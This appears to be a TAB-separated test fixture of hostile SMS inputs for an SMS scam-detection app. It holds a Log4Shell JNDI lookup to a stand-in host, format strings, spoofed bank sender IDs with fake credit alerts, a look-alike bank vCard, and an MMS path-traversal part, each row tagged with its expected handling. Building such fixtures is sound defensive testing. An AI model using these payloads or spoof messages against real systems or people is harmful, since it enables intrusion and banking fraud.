# pwn/injection: text written to break whatever consumes it next: format strings, SQL and FTS4 MATCH syntax,
# HTML / markdown / CSV / JSON / log injection, template placeholders, vCard and MMS-looking text, spoofed sender IDs
# (DLT look-alikes, very long IDs), fake "Dak" system messages and notification-spoofing layouts.
# Format and expectations: README.md in this folder. Columns are TAB-separated.
#! region=IN
# id	sender	expect	tags	body

# ---------------------------------------------------------------- format strings / templates
injection-fmt-01	+919876516001	no-crash,links:0	format-string,log4j	%s%s%s%n%n %x %p %1$s {0} {1} ${jndi:ldap://evil.example/a} %%
injection-snd-02	VM-HDFCBK-SS	fake-credit	dlt-spoof	Rs 20,000.00 credited to A/c XX1234 on 23-09-26. Avl Bal Rs 20,500.00
injection-snd-03	VMM-HDFCBK-S	fake-credit	dlt-spoof	Rs 20,000.00 credited to A/c XX1234 on 23-09-26. Avl Bal Rs 20,500.00
injection-snd-04	VM--HDFCBK-S	fake-credit	dlt-spoof	Rs 20,000.00 credited to A/c XX1234 on 23-09-26. Avl Bal Rs 20,500.00
injection-snd-05	VM-HDFCBKINDIABANKLTD123-S	fake-credit	dlt-spoof,long-header	Rs 20,000.00 credited to A/c XX1234 on 23-09-26. Avl Bal Rs 20,500.00
injection-snd-06	VM-HDFCBK-P	fake-credit,reason:promotional-route	dlt-promo-route	Rs 20,000.00 credited to A/c XX1234 on 23-09-26. Avl Bal Rs 20,500.00
injection-snd-07	+91 98765 16020	likely-scam	formatted-phone,known-gap	Rs 20,000.00 credited to your SBI A/c XX1234 on 23-09-26 by IMPS. Avl Bal Rs 20,500.00
injection-snd-08	{repeat:"A":10000}	no-crash	long-sender	Rs 500 credited to A/c XX1234
injection-snd-09	VM-HDFCBK-S\nVM-SBIINB-S	no-crash,fake-credit	newline-sender	Rs 20,000.00 credited to A/c XX1234 on 23-09-26. Avl Bal Rs 20,500.00
injection-snd-10	<empty>	no-crash	empty-sender	Rs 20,000.00 credited to A/c XX1234 on 23-09-26. Call 9876516021
injection-snd-11	vm-hdfcbk-s	no-crash	lowercase-dlt	Rs 20,000.00 credited to A/c XX1234 on 23-09-26. Avl Bal Rs 20,500.00

# ---------------------------------------------------------------- vCard / MMS-looking text
injection-vcard-01	+919876516022	no-crash	vcard	BEGIN:VCARD\nVERSION:3.0\nFN:HDFC Bank Customer Care\nTEL;TYPE=CELL:+919876516023\nURL:https://hdfc-care.top\nEND:VCARD
injection-mms-01	+919876516024	no-crash	mms,smil	--boundary\r\nContent-Type: application/smil\r\nContent-Location: ../../evil.smil\r\n\r\n<smil><body><par><img src="file:///sdcard/x"/></par></body></smil>\r\n--boundary--
injection-wap-01	+919876516025	no-crash	wap-push	\u0001\u0006\u0006¾\u008C\u0082\u0098content://mms/part/1\u0000\u0083http://\u0000
